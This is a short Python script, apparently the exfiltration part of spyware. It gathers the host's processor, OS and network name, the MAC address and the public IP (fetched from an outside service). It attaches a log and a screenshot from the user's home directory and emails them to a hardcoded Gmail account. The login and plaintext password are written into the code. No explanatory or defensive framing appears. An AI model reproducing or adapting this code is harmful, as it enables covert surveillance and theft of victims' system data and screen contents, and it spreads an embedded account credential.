import smtplib, ssl
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email import encoders
from uuid import getnode as mac
import platform as pf
import time
import os
import re
import requests

directoire = os.path.expanduser('~') + '/'


def INFO():
    processor = pf.processor()
    name_sys = pf.system() + " " + pf.release()
    net_pc = pf.node()
    global pc_config, directoire

    pc_config = f'''

    Processor : {processor}\n
    System name : {name_sys}\n
    Network name : {net_pc}\n

    '''

    file = open(directoire + '/log.txt', 'w')
    file.write(pc_config)
    file.close()


INFO()


def SEND_MAIL():
    port = 587
    smtp_server = "smtp.gmail.com"
    sender_email = "DiasGuSaid2016@gmail.com"
    receiver_email = "DiasGuSaid2016@gmail.com"
    password = "123581321said"

    mac_id = ':'.join(re.findall('..', '%012x' % mac()))
    ip_id = requests.get("https://ramziv.com/ip").text

    msg = MIMEMultipart()
    msg['Subject'] = "MAC address: " + mac_id + "    " + "IP address: " + ip_id
    msg['From'] = ''

    try:
        with open(directoire + 'log.txt') as fp:
            file = MIMEText(fp.read())
    except (FileNotFoundError, UnboundLocalError):
        pass

    img_data = open(directoire + '/screenshot.png', 'rb').read()
    poto = MIMEImage(img_data, 'png')
    msg.attach(file)
    msg.attach(poto)

    context = ssl.create_default_context()
    server = smtplib.SMTP(smtp_server, port)
    server.starttls(context=context)
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, msg.as_string())